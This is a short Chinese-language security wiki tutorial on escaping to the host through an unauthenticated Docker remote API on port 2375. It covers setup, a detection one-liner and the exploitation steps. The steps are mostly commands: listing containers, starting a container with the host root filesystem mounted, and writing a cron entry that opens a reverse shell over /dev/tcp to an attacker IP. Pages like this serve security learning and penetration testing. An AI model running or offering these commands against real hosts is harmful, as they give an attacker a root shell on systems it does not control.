---
title: Docker 远程 API 未授权访问逃逸


---

<center><h1>Docker 远程 API 未授权访问逃逸</h1></center>

---

docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker

## 搭建

将 docker 守护进程监听在 0.0.0.0

```bash
dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
```

## 检测

```bash
IP=`hostname -i | awk -F. '{print $1 "." $2 "." $3 ".1"}' ` && wget http://$IP:2375
```

如果返回 404 说明存在

<img width="1200" src="/img/1650014660.png">

## 复现

列出容器信息

```bash
curl http://<target>:2375/containers/json
```

查看容器

```bash
docker -H tcp://<target>:2375 ps -a
```

新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。

```bash
docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
```

在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root

```bash
echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/12345 0>&1' >> /mnt/var/spool/cron/crontabs/root
```

本地监听端口，获取对方宿主机shell。

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年4月15日"
    }
  }
</script>